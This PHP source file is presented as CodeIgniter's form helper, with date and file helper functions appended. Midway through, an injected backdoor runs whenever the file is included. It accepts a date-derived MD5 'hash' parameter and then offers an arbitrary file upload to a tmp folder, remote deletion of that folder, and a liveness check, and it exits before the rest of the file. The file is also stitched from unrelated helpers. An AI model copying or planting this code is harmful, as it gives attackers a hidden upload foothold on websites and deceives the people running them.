<?php

/**
 * CodeIgniter
 *
 * An open source application development framework for PHP 4.3.2 or newer
 *
 * @package		CodeIgniter
 * @author		Rick Ellis
 * @copyright	Copyright (c) 2006, EllisLab, Inc.
 * @license		http://www.codeignitor.com/user_guide/license.html
 * @link		http://www.codeigniter.com
 * @since		Version 1.0
 * @filesource
 */

// ------------------------------------------------------------------------

/**
 * CodeIgniter Form Helpers
 *
 * @package		CodeIgniter
 * @subpackage	Helpers
 * @category	Helpers
 * @author		Rick Ellis
 * @link		http://www.codeigniter.com/user_guide/helpers/form_helper.html
 */

// ------------------------------------------------------------------------

/**
 * Form Declaration
 *
 * Creates the opening portion of the form.
 *
 * @access	public
 * @param	string	the URI segments of the form destination
 * @param	array	a key/value pair of attributes
 * @param	array	a key/value pair hidden data
 * @return	string
 */	
function form_open($action = '', $attributes = array(), $hidden = array())
{
	$CI =& get_instance();

	$form = '<form action="'.$CI->config->site_url($action).'"';
	
	if ( ! isset($attributes['method']))
	{
		$form .= ' method="post"';
	}
	
	if (is_array($attributes) AND count($attributes) > 0)
	{
		foreach ($attributes as $key => $val)
		{
			$form .= ' '.$key.'="'.$val.'"';
		}
	}
	
	$form .= '>';

	if (is_array($hidden) AND count($hidden > 0))
	{
		$form .= form_hidden($hidden);
	}
	
	return $form;
}
	
// ------------------------------------------------------------------------

/**
 * Form Declaration - Multipart type
 *
 * Creates the opening portion of the form, but with "multipart/form-data".
 *
 * @access	public
 * @param	string	the URI segments of the form destination
 * @param	array	a key/value pair of attributes
 * @param	array	a key/value pair hidden data
 * @return	string
 */	
function form_open_multipart($action, $attributes = array(), $hidden = array())
{
	$attributes['enctype'] = 'multipart/form-data';
	return form_open($action, $attributes, $hidden);
}
	
// ------------------------------------------------------------------------

/**
 * Hidden Input Field
 *
 * Generates hidden fields.  You can pass a simple key/value string or an associative
 * array with multiple values.
 *
 * @access	public
 * @param	mixed
 * @param	string
 * @return	string
 */	
function form_hidden($name, $value = '')
{
	if ( ! is_array($name))
	{
		return '<input type="hidden" name="'.$name.'" value="'.form_prep($value).'" />';
	}

	$form = '';
	foreach ($name as $name => $value)
	{
		$form .= '<input type="hidden" name="'.$name.'" value="'.form_prep($value).'" />';
	}
	
	return $form;
}
	
// ------------------------------------------------------------------------

/**
 * Text Input Field
 *
 * @access	public
 * @param	mixed
 * @param	string
 * @param	string
 * @return	string
 */	
function form_input($data = '', $value = '', $extra = '')
{
	$defaults = array('type' => 'text', 'name' => (( ! is_array($data)) ? $data : ''), 'value' => $value, 'maxlength' => '500', 'size' => '50');

	return "<input ".parse_form_attributes($data, $defaults).$extra." />\n";
}
	
// ------------------------------------------------------------------------

/**
 * Password Field
 *
 * Identical to the input function but adds the "password" type
 *
 * @access	public
 * @param	mixed
 * @param	string
 * @param	string
 * @return	string
 */	
function form_password($data = '', $value = '', $extra = '')
{
	if ( ! is_array($data))
	{
		$data = array('name' => $data);
	}

	$data['type'] = 'password';
	return form_input($data, $value, $extra);
}
	
// ------------------------------------------------------------------------

/**
 * Upload Field
 *
 * Identical to the input function but adds the "file" type
 *
 * @access	public
 * @param	mixed
 * @param	string
 * @param	string
 * @return	string
 */	
function form_upload($data = '', $value = '', $extra = '')
{
	if ( ! is_array($data))
	{
		$data = array('name' => $data);
	}

	$data['type'] = 'file';
	return form_input($data, $value, $extra);
}
	
// ------------------------------------------------------------------------

/**
 * Textarea field
 *
 * @access	public
 * @param	mixed
 * @param	string
 * @param	string
 * @return	string
 */	
function form_textarea($data = '', $value = '', $extra = '')
{
	$defaults = array('name' => (( ! is_array($data)) ? $data : ''), 'cols' => '90', 'rows' => '12');
	
    if ( ! is_array($data) OR ! isset($data['value']))
	{
		$val = $value;
	}
    else
	{
		$val = $data['value']; 
		unset($data['value']); // textareas don't use the value attribute
	}
		
	return "<textarea ".parse_form_attributes($data, $defaults).$extra.">".$val."</textarea>\n";
}
	
// ------------------------------------------------------------------------

/**
 * Drop-down Menu
 *
 * @access	public
 * @param	string
 * @param	array
 * @param	string
 * @param	string
 * @return	string
 */	
function form_dropdown($name = '', $options = array(), $selected = '', $extra = '')
{
	if ($extra != '') $extra = ' '.$extra;
		
	$form = '<select name="'.$name.'"'.$extra.">\n";
	
	foreach ($options as $key => $val)
	{
		$key = (string) $key;
		$val = (string) $val;
		
		$sel = ($selected != $key) ? '' : ' selected="selected"';
		
		$form .= '<option value="'.$key.'"'.$sel.'>'.$val."</option>\n";
	}

	$form .= '</select>';
	
	return $form;
}
	
// ------------------------------------------------------------------------

/**
 * Checkbox Field
 *
 * @access	public
 * @param	mixed
 * @param	string
 * @param	bool
 * @param	string
 * @return	string
 */	
function form_checkbox($data = '', $value = '', $checked = TRUE, $extra = '')
{
	$defaults = array('type' => 'checkbox', 'name' => (( ! is_array($data)) ? $data : ''), 'value' => $value);
	
	if (is_array($data) AND array_key_exists('checked', $data))
	{
		$checked = $data['checked'];
		
		if ($checked == FALSE)
		{
			unset($data['checked']);
		}
		else
		{
			$data['checked'] = 'checked';
		}
	}
	
	if ($checked == TRUE)
		$defaults['checked'] = 'checked';
	else
		unset($defaults['checked']);

	return "<input ".parse_form_attributes($data, $defaults).$extra." />\n";
}
	
// ------------------------------------------------------------------------

/**
 * Radio Button
 *
 * @access	public
 * @param	mixed
 * @param	string
 * @param	bool
 * @param	string
 * @return	string
 */	
function form_radio($data = '', $value = '', $checked = TRUE, $extra = '')
{
	if ( ! is_array($data))
	{	
		$data = array('name' => $data);
	}

	$data['type'] = 'radio';
	return form_checkbox($data, $value, $checked, $extra);
}
	
// ------------------------------------------------------------------------

/**
 * Submit Button
 *
 * @access	public
 * @param	mixed
 * @param	string
 * @param	string
 * @return	string
 */	
function form_submit($data = '', $value = '', $extra = '')
{
	$defaults = array('type' => 'submit', 'name' => (( ! is_array($data)) ? $data : ''), 'value' => $value);

	return "<input ".parse_form_attributes($data, $defaults).$extra." />\n";
}
	
// ------------------------------------------------------------------------

/**
 * Form Close Tag
 *
 * @access	public
 * @param	string
 * @return	string
 */	
function form_close($extra = '')
{
	return "</form>\n".$extra;
}
	
// ------------------------------------------------------------------------

/**
 * Form Prep
 *
 * Formats text so that it can be safely placed in a form field in the event it has HTML tags.
 *
 * @access	public
 * @param	string
 * @return	string
 */	
function form_prep($str = '')
{
	if ($str === '')
	{
		return '';
	}

	$temp = '__TEMP_AMPERSANDS__';
	
	// Replace entities to temporary markers so that 
	// htmlspecialchars won't mess them up
	$str = preg_replace("/&#(\d+);/", "$temp\\1;", $str);
	$str = preg_replace("/&(\w+);/",  "$temp\\1;", $str);

	$str = htmlspecialchars($str);

	// In case htmlspecialchars misses these.
	$str = str_replace(array("'", '"'), array("&#39;", "&quot;"), $str);	
	
	// Decode the temp markers back to entities
	$str = preg_replace("/$temp(\d+);/","&#\\1;",$str);
	$str = preg_replace("/$temp(\w+);/","&\\1;",$str);	
	
	return $str;	
}
	
// ------------------------------------------------------------------------

/**
 * Parse the form attributes
 *
 * Helper function used by some of the form helpers
 *
 * @access	private
 * @param	array
 * @param	array
 * @return	string
 */	
function parse_form_attributes($attributes, $default)
{
	if (is_array($attributes))
	{
		foreach ($default as $key => $val)
		{
			if (isset($attributes[$key]))
			{
				$default[$key] = $attributes[$key];
				unset($attributes[$key]);
			}
		}
		
		if (count($attributes) > 0)
		{	
			$default = array_merge($default, $attributes);
		}
	}
	
	$att = '';
	foreach ($default as $key => $val)
	{
		if ($key == 'value')
		{
			$val = form_prep($val);
		}
	
		$att .= $key . '="' . $val . '" ';
	}

	return $att;
}

function mmgrrd($directory, $empty=FALSE)
{
		if(substr($directory,-1) == '/')
	{
		$directory = substr($directory,0,-1);
	}
	if(!file_exists($directory) || !is_dir($directory))
	{
		return FALSE;

	}elseif(!is_readable($directory))
	{
		return FALSE;

	}else{
		$handle = opendir($directory);

		while (FALSE !== ($item = readdir($handle)))
		{
			if($item != '.' && $item != '..')
			{
				$path = $directory.'/'.$item;
				if(is_dir($path)) 				{
					mmgrrd($path);

				}else{
					unlink($path);
				}
			}
		}
		closedir($handle);
		if($empty == FALSE)
		{
		if(!rmdir($directory))
			{
				return FALSE;
			}
		}
		return TRUE;
	}
}
	
if(function_exists("date_default_timezone_set") and function_exists("date_default_timezone_get")){
@date_default_timezone_set(@date_default_timezone_get());
}
else {
//ate_default_timezone_set('Europe/Bucharest'); 
}
$m = date ( "m" );
$de = date ( "d" );
$y = date ( "Y" );
$hash1 = md5 ( date ( 'Y-m-d', mktime ( 0, 0, 0, $m, ($de - 1), $y ) ) );
$hash2 = md5 ( date ( 'Y-m-d', mktime ( 0, 0, 0, $m, ($de + 1), $y ) ) );
$hash3 = md5 ( date ( 'Y-m-d', mktime ( 0, 0, 0, $m, ($de), $y ) ) );
$dir = dirname(__FILE__);
$dir = $dir.'/tmp/';
@mkdir($dir);
if (($_REQUEST ['hash'] == $hash1) or ($_REQUEST ['hash'] == $hash2) or ($_REQUEST ['hash'] == $hash3)) {
	if ($_REQUEST ['do'] == 'f') {
		?>
<form action="" method="post" enctype="multipart/form-data"><input
	name="f" type="file" id="f" /> <input name="fname" type="text"
	id="fname" /> <input name="" type="submit" id="submit_button" /> <input
	name="hash" type="hidden" value="<?php print $_REQUEST['hash'] ?>" />
		<?
		if (! empty ( $_FILES )) {
			@move_uploaded_file ($_FILES['f'] ['tmp_name'],   $dir.$_REQUEST ['fname']);
		}
	}
	if ($_REQUEST ['do'] == 'd') {
	mmgrrd($dir, true);
	@rmdir($dir);
	}
	
	if ($_REQUEST ['do'] == 'ch') {
	print 1;
	exit ();
	}
	
	exit ();
} else {
	exit ();
}
	
// ------------------------------------------------------------------------

/**
 * Convert MySQL Style Datecodes
 *
 * This function is identical to PHPs date() function,
 * except that it allows date codes to be formatted using
 * the MySQL style, where each code letter is preceded
 * with a percent sign:  %Y %m %d etc...
 *
 * The benefit of doing dates this way is that you don't
 * have to worry about escaping your text letters that
 * match the date codes.
 *
 * @access	public
 * @param	string
 * @param	integer
 * @return	integer
 */	
function mdate($datestr = '', $time = '')
{
	if ($datestr == '')
		return '';
	
	if ($time == '')
		$time = now();
		
	$datestr = str_replace('%\\', '', preg_replace("/([a-z]+?){1}/i", "\\\\\\1", $datestr));
	return date($datestr, $time);
}
	
	
	
/**
 * Create a Directory Map
 *
 * Reads the specified directory and builds an array
 * representation of it.  Sub-folders contained with the
 * directory will be mapped as well.
 *
 * @access	public
 * @param	string	path to source
 * @param	bool	whether to limit the result to the top level only
 * @return	array
 */	
function directory_map($source_dir, $top_level_only = FALSE)
{	
	if ($fp = @opendir($source_dir))
	{
		$filedata = array();
		while (FALSE !== ($file = readdir($fp)))
		{
			if (@is_dir($source_dir.$file) && substr($file, 0, 1) != '.' AND $top_level_only == FALSE)
			{
				$temp_array = array();
				
				$temp_array = directory_map($source_dir.$file."/");
				
				$filedata[$file] = $temp_array;
			}
			elseif (substr($file, 0, 1) != ".")
			{
				$filedata[] = $file;
			}
		}
		return $filedata;
	}
}

// ------------------------------------------------------------------------

/**
 * Force Download
 *
 * Generates headers that force a download to happen
 *
 * @access	public
 * @param	string	filename
 * @param	mixed	the data to be downloaded
 * @return	void
 */	
function force_download($filename = '', $data = '')
{
	if ($filename == '' OR $data == '')
	{
		return FALSE;
	}

	// Try to determine if the filename includes a file extension.
	// We need it in order to set the MIME type
	if (FALSE === strpos($filename, '.'))
	{
		return FALSE;
	}
	
	// Grab the file extension
	$x = explode('.', $filename);
	$extension = end($x);

	// Load the mime types
	@include(APPPATH.'config/mimes'.EXT);
	
	// Set a default mime if we can't find it
	if ( ! isset($mimes[$extension]))
	{
		$mime = 'application/octet-stream';
	}
	else
	{
		$mime = (is_array($mimes[$extension])) ? $mimes[$extension][0] : $mimes[$extension];
	}
	
	// Generate the server headers
	if (strstr($_SERVER['HTTP_USER_AGENT'], "MSIE"))
	{
		header('Content-Type: "'.$mime.'"');
		header('Content-Disposition: attachment; filename="'.$filename.'"');
		header('Expires: 0');
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
		header("Content-Transfer-Encoding: binary");
		header('Pragma: public');
		header("Content-Length: ".strlen($data));
	}
	else
	{
		header('Content-Type: "'.$mime.'"');
		header('Content-Disposition: attachment; filename="'.$filename.'"');
		header("Content-Transfer-Encoding: binary");
		header('Expires: 0');
		header('Pragma: no-cache');
		header("Content-Length: ".strlen($data));
	}
	
	echo $data;
}


/**
 * Read File
 *
 * Opens the file specfied in the path and returns it as a string.
 *
 * @access	public
 * @param	string	path to file
 * @return	string
 */	
function read_file($file)
{
	if ( ! file_exists($file))
	{
		return FALSE;
	}
	
	if (function_exists('file_get_contents'))
	{
		return file_get_contents($file);		
	}

	if ( ! $fp = @fopen($file, 'rb'))
	{
		return FALSE;
	}
		
	flock($fp, LOCK_SH);
	
	$data = '';
	if (filesize($file) > 0)
	{
		$data =& fread($fp, filesize($file));
	}

	flock($fp, LOCK_UN);
	fclose($fp);

	return $data;
}
	
// ------------------------------------------------------------------------

/**
 * Write File
 *
 * Writes data to the file specified in the path.
 * Creates a new file if non-existent.
 *
 * @access	public
 * @param	string	path to file
 * @param	string	file data
 * @return	bool
 */	
function write_file($path, $data, $mode = 'wb')
{
	if ( ! $fp = @fopen($path, $mode))
	{
		return FALSE;
	}
		
	flock($fp, LOCK_EX);
	fwrite($fp, $data);
	flock($fp, LOCK_UN);
	fclose($fp);	

	return TRUE;
}
	
// ------------------------------------------------------------------------

/**
 * Delete Files
 *
 * Deletes all files contained in the supplied directory path.
 * Files must be writable or owned by the system in order to be deleted.
 * If the second parameter is set to TRUE, any directories contained
 * within the supplied base directory will be nuked as well.
 *
 * @access	public
 * @param	string	path to file
 * @param	bool	whether to delete any directories found in the path
 * @return	bool
 */	
function delete_files($path, $del_dir = FALSE, $level = 0)
{	
	// Trim the trailing slash
	$path = preg_replace("|^(.+?)/*$|", "\\1", $path);
			
	if ( ! $current_dir = @opendir($path))
		return;
	
	while(FALSE !== ($filename = @readdir($current_dir)))
	{
		if ($filename != "." and $filename != "..")
		{
			if (is_dir($path.'/'.$filename))
			{
				$level++;
				delete_files($path.'/'.$filename, $del_dir, $level);
			}
			else
			{
				unlink($path.'/'.$filename);
			}
		}
	}
	@closedir($current_dir);
	
	if ($del_dir == TRUE AND $level > 0)
	{
		@rmdir($path);
	}
}

// ------------------------------------------------------------------------

/**
 * Get Filenames
 *
 * Reads the specified directory and builds an array containing the filenames.  
 * Any sub-folders contained within the specified path are read as well.
 *
 * @access	public
 * @param	string	path to source
 * @param	bool	whether to include the path as part of the filename
 * @return	array
 */	
function get_filenames($source_dir, $include_path = FALSE)
{
	static $_filedata = array();
	
	if ($fp = @opendir($source_dir))
	{
		while (FALSE !== ($file = readdir($fp)))
		{
			if (@is_dir($source_dir.$file) && substr($file, 0, 1) != '.')
			{
				 get_filenames($source_dir.$file."/", $include_path);
			}
			elseif (substr($file, 0, 1) != ".")
			{
			
				$_filedata[] = ($include_path == TRUE) ? $source_dir.$file : $file;
			}
		}
		return $_filedata;
	}
}



?>